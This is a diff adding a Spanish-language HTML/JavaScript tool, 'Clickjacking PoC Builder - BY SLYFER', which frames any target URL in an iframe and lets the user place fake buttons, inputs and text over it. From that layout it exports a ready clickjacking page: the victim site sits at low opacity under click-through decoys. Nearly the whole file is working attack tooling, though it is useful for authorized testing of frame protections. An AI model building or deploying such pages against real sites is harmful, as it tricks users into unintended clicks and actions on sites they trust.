@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Clickjacking PoC Builder - BY SLYFER ♥</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html, body {
+  margin: 0; height: 100%; overflow: hidden;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+#target {
+  position: fixed; inset: 0; border: none; z-index: 1;
+  transform-origin: top left;
+  width: 100vw; height: 100vh;
+}
+#capture { position:fixed; inset:0; z-index:2; cursor:crosshair; }
+
+#panel {
+  position:fixed; top:20px; left:20px; width:360px;
+  max-height:calc(100vh - 40px); overflow-y:auto;
+  background:linear-gradient(135deg,rgba(20,20,30,.95),rgba(40,40,50,.95));
+  color:#fff; padding:20px; border-radius:16px; z-index:100;
+  box-shadow:0 10px 40px rgba(0,0,0,0.4); backdrop-filter:blur(10px);
+  border:1px solid rgba(255,255,255,0.1);
+  scrollbar-width:thin; scrollbar-color:rgba(0,212,255,0.4) transparent;
+}
+#panel::-webkit-scrollbar { width:4px; }
+#panel::-webkit-scrollbar-thumb { background:rgba(0,212,255,0.4); border-radius:4px; }
+
+#panel header {
+  cursor:move; font-weight:700; font-size:18px; margin-bottom:15px;
+  text-align:center; color:#00d4ff; text-shadow:0 0 10px rgba(0,212,255,0.5);
+  user-select:none;
+}
+#panel button {
+  margin:4px 2px; padding:8px 16px; border:none; border-radius:8px;
+  cursor:pointer; font-weight:600; transition:all 0.2s ease;
+  box-shadow:0 2px 8px rgba(0,0,0,0.2);
+}
+#panel button:hover { transform:translateY(-2px); box-shadow:0 4px 12px rgba(0,0,0,0.3); }
+#panel button:active { transform:translateY(0); }
+#panel input[type="text"] {
+  width:calc(100% - 20px); margin:6px 0; padding:10px;
+  border:1px solid rgba(255,255,255,0.2); border-radius:8px;
+  background:rgba(255,255,255,0.1); color:#fff; font-size:14px;
+}
+#panel input[type="text"]:focus {
+  outline:none; border-color:#00d4ff;
+  box-shadow:0 0 10px rgba(0,212,255,0.3); background:rgba(255,255,255,0.15);
+}
+#panel input[type="text"]::placeholder { color:rgba(255,255,255,0.5); }
+#panel label {
+  display:block; margin-top:10px; margin-bottom:4px;
+  font-size:12px; color:#00d4ff; font-weight:600;
+  text-transform:uppercase; letter-spacing:0.5px;
+}
+#panel input[type="color"] {
+  width:100%; height:40px; border:none; border-radius:8px; cursor:pointer; margin:4px 0;
+}
+#output {
+  width:calc(100% - 20px); height:160px; margin-top:10px;
+  font-family:'Courier New',monospace; font-size:11px; padding:10px;
+  border:1px solid rgba(255,255,255,0.2); border-radius:8px;
+  background:rgba(0,0,0,0.3); color:#0f0; resize:vertical;
+}
+#panel hr { border:none; border-top:1px solid rgba(255,255,255,0.1); margin:12px 0; }
+
+/* ── Zoom slider ── */
+.zoom-row {
+  display:flex; align-items:center; gap:8px; margin:6px 0;
+}
+.zoom-row button {
+  width:38px; height:38px; padding:0; font-size:20px;
+  flex-shrink:0; margin:0; border-radius:8px;
+}
+#zoomSlider {
+  flex:1; -webkit-appearance:none; appearance:none;
+  height:6px; border-radius:3px;
+  background:rgba(255,255,255,0.2); outline:none; cursor:pointer;
+}
+#zoomSlider::-webkit-slider-thumb {
+  -webkit-appearance:none; width:18px; height:18px;
+  border-radius:50%; background:#00d4ff; cursor:pointer;
+  box-shadow:0 0 8px rgba(0,212,255,0.6);
+}
+#zoomSlider::-moz-range-thumb {
+  width:18px; height:18px; border-radius:50%;
+  background:#00d4ff; cursor:pointer; border:none;
+}
+#zoomLabel {
+  font-size:13px; font-weight:700; color:#00d4ff;
+  min-width:42px; text-align:right; font-family:'Courier New',monospace;
+}
+
+/* ── D-pad ── */
+#moverBox { display:none; margin:8px 0; }
+#moverBox .mover-title {
+  font-size:11px; color:rgba(255,255,255,0.5); text-align:center; margin-bottom:6px;
+}
+.dpad {
+  display:grid;
+  grid-template-columns:1fr 1fr 1fr;
+  gap:4px; width:150px; margin:0 auto;
+}
+.dpad button { width:100%; padding:10px 0; font-size:16px; margin:0; border-radius:8px; }
+.step-toggle { display:flex; gap:6px; justify-content:center; margin-top:8px; }
+.step-toggle button { padding:5px 14px; font-size:12px; margin:0; border-radius:20px; opacity:0.5; }
+.step-toggle button.active { opacity:1; box-shadow:0 0 10px rgba(0,212,255,0.4); }
+#coordsDisplay {
+  font-size:11px; color:rgba(255,255,255,0.45);
+  text-align:center; margin:4px 0;
+  font-family:'Courier New',monospace; display:none;
+}
+
+.fake {
+  position:fixed; z-index:5; user-select:none; cursor:move;
+}
+.fake:hover { filter:brightness(1.1); }
+.fake.box {
+  background:#0a66c2; color:#fff;
+  display:flex; align-items:center; justify-content:center;
+  border-radius:8px; font-weight:600; font-size:15px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.2);
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+}
+.fake.text {
+  background:transparent; color:#000; font-size:18px;
+  display:flex; align-items:center;
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+}
+.fake.selected { outline:3px solid #00ffff; outline-offset:2px; box-shadow:0 0 20px rgba(0,255,255,0.5); }
+.fake.text.selected { background:rgba(0,255,255,0.1); outline:2px dashed #00ffff; }
+.resizer {
+  position:absolute; right:-1px; bottom:-1px; width:10px; height:10px;
+  background:#00ffff; cursor:nwse-resize; z-index:10; border-radius:0 0 8px 0;
+}
+.resizer:hover { background:#00d4ff; transform:scale(1.3); }
+
+.btn-primary { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:#fff; }
+.btn-success { background:linear-gradient(135deg,#2ecc71 0%,#27ae60 100%); color:#fff; }
+.btn-danger  { background:linear-gradient(135deg,#e74c3c 0%,#c0392b 100%); color:#fff; }
+.btn-info    { background:linear-gradient(135deg,#3498db 0%,#2980b9 100%); color:#fff; }
+.btn-warning { background:linear-gradient(135deg,#f39c12 0%,#e67e22 100%); color:#fff; }
+.btn-cyan    { background:linear-gradient(135deg,#00d4ff 0%,#0099cc 100%); color:#000; }
+.btn-group   { display:flex; gap:5px; margin:5px 0; }
+.btn-group button { flex:1; }
+</style>
+</head>
+<body>
+
+<iframe id="target" src=""></iframe>
+<div id="capture"></div>
+
+<div id="panel">
+  <header>⚡ Clickjacking PoC Builder - BY SLYFER ♥</header>
+
+  <button id="toggleCaptureBtn" onclick="toggleCapture()" class="btn-success" style="width:100%;">
+    🟢 Captura ACTIVA
+  </button>
+
+  <hr>
+
+  <label>🌐 URL del iframe</label>
+  <input type="text" id="iframeUrl" placeholder="https://pagina-objetivo.com">
+  <button onclick="loadIframe()" class="btn-info" style="width:100%;">Cargar iframe</button>
+
+  <hr>
+
+  <!-- ZOOM IFRAME -->
+  <label>🔍 Zoom del iframe</label>
+  <div class="zoom-row">
+    <button class="btn-danger" onclick="stepZoom(-10)">−</button>
+    <input type="range" id="zoomSlider" min="30" max="200" value="100" oninput="applyZoom(this.value)">
+    <button class="btn-success" onclick="stepZoom(10)">+</button>
+    <span id="zoomLabel">100%</span>
+  </div>
+  <button onclick="resetZoom()" class="btn-warning" style="width:100%; margin:2px 0 4px;">🔄 Reset zoom</button>
+
+  <hr>
+
+  <label>📝 Texto del elemento</label>
+  <input type="text" id="elementText" placeholder="Texto aquí..." value="Confirmar">
+
+  <hr>
+
+  <label>🎨 Tipo de elemento</label>
+  <div class="btn-group">
+    <button onclick="setType('button')" class="btn-primary">Button</button>
+    <button onclick="setType('input')"  class="btn-primary">Input</button>
+    <button onclick="setType('text')"   class="btn-primary">Texto</button>
+  </div>
+
+  <hr>
+
+  <label>🎨 Color texto</label>
+  <input type="color" id="textColor" value="#ffffff" onchange="setTextColor(this.value)">
+  <label>🎨 Color fondo</label>
+  <input type="color" id="bgColor" value="#0a66c2" onchange="setBgColor(this.value)">
+
+  <hr>
+
+  <div id="moverBox">
+    <div class="mover-title">🎯 Mover elemento seleccionado</div>
+    <div class="step-toggle">
+      <button id="step1btn"  class="btn-cyan active" onclick="setStep(1)">1px</button>
+      <button id="step10btn" class="btn-cyan"        onclick="setStep(10)">10px</button>
+      <button id="step50btn" class="btn-cyan"        onclick="setStep(50)">50px</button>
+    </div>
+    <div class="dpad" style="margin-top:10px;">
+      <div></div>
+      <button class="btn-info" onmousedown="startMove(0,-1)" onmouseup="stopMove()" onmouseleave="stopMove()">▲</button>
+      <div></div>
+      <button class="btn-info" onmousedown="startMove(-1,0)" onmouseup="stopMove()" onmouseleave="stopMove()">◀</button>
+      <button class="btn-danger" onclick="deleteSelected()" title="Eliminar">🗑</button>
+      <button class="btn-info" onmousedown="startMove(1,0)"  onmouseup="stopMove()" onmouseleave="stopMove()">▶</button>
+      <div></div>
+      <button class="btn-info" onmousedown="startMove(0,1)"  onmouseup="stopMove()" onmouseleave="stopMove()">▼</button>
+      <div></div>
+    </div>
+    <div id="coordsDisplay">x: 0 &nbsp;&nbsp; y: 0</div>
+  </div>
+
+  <hr>
+
+  <label>💾 Código HTML</label>
+  <textarea id="output" placeholder="El código aparecerá aquí..."></textarea>
+</div>
+
+<script>
+let currentType    = "button";
+let elements       = [];
+let id             = 0;
+let selected       = null;
+let captureEnabled = true;
+let moveStep       = 1;
+let moveInterval   = null;
+let iframeZoom     = 1; // escala actual del iframe (1 = 100%)
+
+// ── Zoom iframe ──────────────────────────────────────────────────────────
+function applyZoom(val) {
+  iframeZoom = val / 100;
+  target.style.transform = `scale(${iframeZoom})`;
+  // Cuando el iframe es más pequeño necesitamos que siga ocupando el origen
+  target.style.width  = (100 / iframeZoom) + "vw";
+  target.style.height = (100 / iframeZoom) + "vh";
+  document.getElementById("zoomLabel").textContent = val + "%";
+  document.getElementById("zoomSlider").value = val;
+}
+
+function stepZoom(delta) {
+  const current = parseInt(document.getElementById("zoomSlider").value);
+  const next = Math.min(200, Math.max(30, current + delta));
+  applyZoom(next);
+}
+
+function resetZoom() { applyZoom(100); }
+// ─────────────────────────────────────────────────────────────────────────
+
+// ── D-pad ────────────────────────────────────────────────────────────────
+function startMove(dx, dy) {
+  if (!selected) return;
+  moveEl(dx, dy);
+  moveInterval = setInterval(() => moveEl(dx, dy), 80);
+}
+function stopMove() {
+  clearInterval(moveInterval);
+  moveInterval = null;
+  exportHTML();
+}
+function moveEl(dx, dy) {
+  if (!selected) return;
+  selected.x += dx * moveStep;
+  selected.y += dy * moveStep;
+  selected.node.style.left = selected.x + "px";
+  selected.node.style.top  = selected.y + "px";
+  updateCoords();
+}
+function setStep(s) {
+  moveStep = s;
+  document.getElementById("step1btn").classList.toggle("active",  s === 1);
+  document.getElementById("step10btn").classList.toggle("active", s === 10);
+  document.getElementById("step50btn").classList.toggle("active", s === 50);
+}
+function deleteSelected() {
+  if (!selected) return;
+  deleteElement(selected, selected.node);
+}
+function updateCoords() {
+  if (!selected) return;
+  document.getElementById("coordsDisplay").textContent =
+    `x: ${Math.round(selected.x)}   y: ${Math.round(selected.y)}`;
+}
+// ─────────────────────────────────────────────────────────────────────────
+
+function setType(t) {
+  currentType = t;
+  if (t === "input") {
+    elementText.placeholder = "Placeholder del input...";
+    if (elementText.value === "Confirmar") elementText.value = "Ingrese email";
+  } else if (t === "text") {
+    elementText.placeholder = "Texto a mostrar...";
+    if (elementText.value === "Ingrese email") elementText.value = "Texto editable";
+  } else {
+    elementText.placeholder = "Texto del botón...";
+    if (["Ingrese email","Texto editable"].includes(elementText.value)) elementText.value = "Confirmar";
+  }
+}
+
+function loadIframe() {
+  const url = iframeUrl.value.trim();
+  if (url) target.src = url;
+}
+
+function toggleCapture() {
+  captureEnabled = !captureEnabled;
+  capture.style.pointerEvents = captureEnabled ? "auto" : "none";
+  toggleCaptureBtn.innerText  = captureEnabled ? "🟢 Captura ACTIVA" : "🔴 Captura DESACTIVADA";
+  toggleCaptureBtn.className  = captureEnabled ? "btn-success" : "btn-danger";
+}
+
+capture.addEventListener("click", e => {
+  if (!captureEnabled) return;
+  id++;
+  const text = elementText.value.trim() || "Sin texto";
+  const el = {
+    id, type: currentType,
+    x: e.clientX - 130,
+    y: e.clientY - 40,
+    w: 260, h: 80, text,
+    color: textColor.value, bg: bgColor.value
+  };
+  elements.push(el);
+  draw(el);
+  exportHTML();
+});
+
+function draw(el) {
+  let node;
+  if (el.type === "input") {
+    node = document.createElement("input");
+    node.placeholder = el.text;
+    node.className   = "fake box";
+    node.readOnly    = true;
+  } else {
+    node = document.createElement("div");
+    node.innerText = el.text;
+    node.className = "fake " + (el.type === "text" ? "text" : "box");
+  }
+  node.style.left       = el.x + "px";
+  node.style.top        = el.y + "px";
+  node.style.width      = el.w + "px";
+  node.style.height     = el.h + "px";
+  node.style.color      = el.color;
+  node.style.background = el.type === "text" ? "transparent" : el.bg;
+  node.onclick    = ev => { ev.stopPropagation(); select(el, node); };
+  node.ondblclick = ev => { ev.stopPropagation(); deleteElement(el, node); };
+  enableDrag(node, el);
+  enableResize(node, el);
+  document.body.appendChild(node);
+  el.node = node;
+  select(el, node);
+}
+
+function select(el, node) {
+  document.querySelectorAll(".fake").forEach(n => n.classList.remove("selected"));
+  node.classList.add("selected");
+  selected        = el;
+  textColor.value = el.color;
+  bgColor.value   = el.bg;
+  document.getElementById("moverBox").style.display     = "block";
+  document.getElementById("coordsDisplay").style.display = "block";
+  updateCoords();
+}
+
+function deselect() {
+  document.querySelectorAll(".fake").forEach(n => n.classList.remove("selected"));
+  selected = null;
+  document.getElementById("moverBox").style.display     = "none";
+  document.getElementById("coordsDisplay").style.display = "none";
+}
+
+function setTextColor(c) {
+  if (!selected) return;
+  selected.color = c;
+  selected.node.style.color = c;
+  exportHTML();
+}
+
+function setBgColor(c) {
+  if (!selected || selected.type === "text") return;
+  selected.bg = c;
+  selected.node.style.background = c;
+  exportHTML();
+}
+
+function deleteElement(el, node) {
+  elements = elements.filter(e => e.id !== el.id);
+  node.remove();
+  deselect();
+  exportHTML();
+}
+
+function enableDrag(node, el) {
+  let ox, oy, drag = false;
+  node.addEventListener("mousedown", e => {
+    if (e.target.classList.contains("resizer")) return;
+    e.preventDefault();
+    select(el, node);
+    drag = true;
+    capture.style.pointerEvents = "none";
+    ox = e.clientX - el.x;
+    oy = e.clientY - el.y;
+  });
+  document.addEventListener("mousemove", e => {
+    if (!drag) return;
+    el.x = e.clientX - ox;
+    el.y = e.clientY - oy;
+    node.style.left = el.x + "px";
+    node.style.top  = el.y + "px";
+    updateCoords();
+  });
+  document.addEventListener("mouseup", () => {
+    if (drag) {
+      drag = false;
+      if (captureEnabled) capture.style.pointerEvents = "auto";
+      exportHTML();
+    }
+  });
+}
+
+function enableResize(node, el) {
+  const r = document.createElement("div");
+  r.className = "resizer";
+  node.appendChild(r);
+  let sx, sy, res = false;
+  r.addEventListener("mousedown", e => {
+    res = true; sx = e.clientX; sy = e.clientY;
+    capture.style.pointerEvents = "none";
+    e.stopPropagation(); e.preventDefault();
+  });
+  document.addEventListener("mousemove", e => {
+    if (!res) return;
+    el.w += e.clientX - sx; el.h += e.clientY - sy;
+    sx = e.clientX; sy = e.clientY;
+    node.style.width  = el.w + "px";
+    node.style.height = el.h + "px";
+  });
+  document.addEventListener("mouseup", () => {
+    if (res) {
+      res = false;
+      if (captureEnabled) capture.style.pointerEvents = "auto";
+      exportHTML();
+    }
+  });
+}
+
+// Panel drag
+(() => {
+  const h = panel.querySelector("header");
+  let ox, oy, drag = false;
+  h.onmousedown = e => { drag = true; ox = e.clientX - panel.offsetLeft; oy = e.clientY - panel.offsetTop; };
+  document.onmousemove = e => { if (!drag) return; panel.style.left = e.clientX - ox + "px"; panel.style.top = e.clientY - oy + "px"; };
+  document.onmouseup = () => drag = false;
+})();
+
+function exportHTML() {
+  let css = "", html = "";
+  const src = iframeUrl.value || "https://victima.com";
+
+  elements.forEach(e => {
+    const isBox = e.type === "button" || e.type === "input";
+    css += `.el${e.id}{
+  position:fixed;
+  left:${Math.round(e.x)}px;
+  top:${Math.round(e.y)}px;
+  width:${e.w}px;
+  height:${e.h}px;
+  color:${e.color};
+  ${isBox ? `background:${e.bg};` : ""}
+  z-index:999;
+  pointer-events:none;
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+  font-weight:600;
+  font-size:${isBox ? "15" : "18"}px;
+  ${isBox ? "display:flex;align-items:center;justify-content:center;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.2);border:none;" : ""}
+}
+`;
+    if (e.type === "input") {
+      html += `<input class="el${e.id}" placeholder="${e.text}" readonly>\n`;
+    } else {
+      html += `<div class="el${e.id}">${e.text}</div>\n`;
+    }
+  });
+
+  // En el HTML exportado el iframe también lleva el zoom aplicado
+  const zoomVal = Math.round(iframeZoom * 100);
+  const iframeStyle = iframeZoom !== 1
+    ? ` style="transform:scale(${iframeZoom});transform-origin:top left;width:${Math.round(100/iframeZoom)}vw;height:${Math.round(100/iframeZoom)}vh;"`
+    : "";
+
+  output.value = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{margin:0;height:100vh;overflow:hidden;font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);}
+iframe{position:fixed;inset:0;border:none;z-index:1;opacity:0.2;}
+${css}
+</style>
+</head>
+<body>
+<iframe src="${src}"${iframeStyle}></iframe>
+${html}
+</body>
+</html>`;
+}
+</script>
+</body>
+</html>
